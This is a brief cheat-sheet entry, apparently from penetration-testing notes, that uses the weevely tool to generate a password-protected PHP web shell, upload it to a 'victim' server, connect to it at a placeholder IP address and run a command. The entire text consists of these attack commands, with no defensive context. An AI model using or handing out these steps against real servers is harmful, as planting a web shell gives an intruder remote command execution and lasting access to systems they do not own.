Quick webshell creation and usage
----------------------------------
```bash
# create web shell
weevely generate 1234 ./weevley.php

### upload file to victim

# get webshell
weevely http://xxx.xxx.xxx.xxx/weevley.php 1234
# use ctrl-c to exit

# run single command
weevely http://xxx.xxx.xxx.xxx/weevley.php 1234 whoami
```
